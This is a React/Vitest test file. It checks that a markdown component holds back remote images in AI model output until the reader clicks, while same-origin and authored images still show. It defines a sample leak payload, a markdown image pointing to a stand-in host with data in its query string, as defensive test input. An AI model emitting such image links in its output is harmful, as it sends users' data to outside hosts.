import { fireEvent, render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { Md } from "./Md";

const LEAK = "![x](https://example.invalid/p?d=abc)";

describe("<Md> images (S31)", () => {
  it("model output does not auto-load an image from another site", () => {
    const { container } = render(<Md ai>{LEAK}</Md>);
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByRole("button", { name: /Load image from example\.invalid/ })).toBeInTheDocument();
  });

  it("the image loads only after the reader clicks", () => {
    const { container } = render(<Md ai>{LEAK}</Md>);
    fireEvent.click(screen.getByRole("button", { name: /Load image/ }));
    expect(container.querySelector("img")?.getAttribute("src")).toBe("https://example.invalid/p?d=abc");
  });

  it("same-origin images in model output still show", () => {
    const { container } = render(<Md ai>{"![d](/media/diagram.png)"}</Md>);
    expect(container.querySelector("img")?.getAttribute("src")).toBe("/media/diagram.png");
  });

  it("authored lesson markdown keeps its pictures", () => {
    const { container } = render(<Md>{LEAK}</Md>);
    expect(container.querySelector("img")?.getAttribute("src")).toBe("https://example.invalid/p?d=abc");
  });
});
